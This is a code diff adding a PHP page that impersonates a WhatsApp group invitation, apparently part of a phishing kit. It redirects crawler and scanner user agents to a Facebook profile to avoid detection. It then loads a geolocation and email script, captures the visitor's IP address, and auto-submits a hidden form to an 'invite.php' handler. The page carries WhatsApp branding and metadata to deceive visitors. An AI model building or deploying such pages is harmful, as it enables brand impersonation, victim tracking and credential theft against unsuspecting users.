@@ -1,0 +1,35 @@
+<?php
+$ua = $_SERVER['HTTP_USER_AGENT'];
+if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
+{
+header('Location: https://www.facebook.com/yulio6166');
+die();
+}
+?>
+<?php
+include 'TokoAlexHost.com/daerah.php';
+include 'email.php';
+$ipaddress = $alex['query'];
+?>
+<title>Undangan Grup WhatsApp</title> 
+<meta name = "viewport" content = "width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" >
+<meta name = "theme-color" content = "#005e54" >
+<meta name = "msapplication-navbutton-color" content = "#005e54" >
+<meta name = "apple-mobile-web-app-capable" content = "yes" >
+<meta property = "og:title" content = "Undangan Grup WhatsApp" >
+<meta property = "og:image" content = "https://assets.stickpng.com/images/580b57fcd9996e24bc43c543.png" >
+<meta property = "og:site_name" content = "WhatsApp.com" >
+<meta property = "og:description" content = "Undangan Grup WhatsApp" >
+<meta property = "description" content = "Undangan Grup WhatsApp" >
+<meta name = "apple-mobile-web-app-status-bar-style" content = "#005e54" >
+<meta name = "mobile-web-app-capable" content = "yes" >
+<meta name = "robots" content = "noindex" >
+<link rel = "apple-touch-icon" type = "image/png" href = "https://assets.stickpng.com/images/580b57fcd9996e24bc43c543.png" >
+<link rel = "shortcut icon" type = "image/x-icon" href = "https://assets.stickpng.com/images/580b57fcd9996e24bc43c543.png" >
+<link rel = "mask-icon" type = "" href = "https://assets.stickpng.com/images/580b57fcd9996e24bc43c543.png" color = "#005e54" >
+
+
+<form id='tokoalexhost.com' method='POST' action='invite.php'>
+<input type='hidden' name='ip' value='<?php echo $ipaddress;?>'>
+</form>
+<script type='text/javascript'>document.getElementById('tokoalexhost.com').submit();</script>
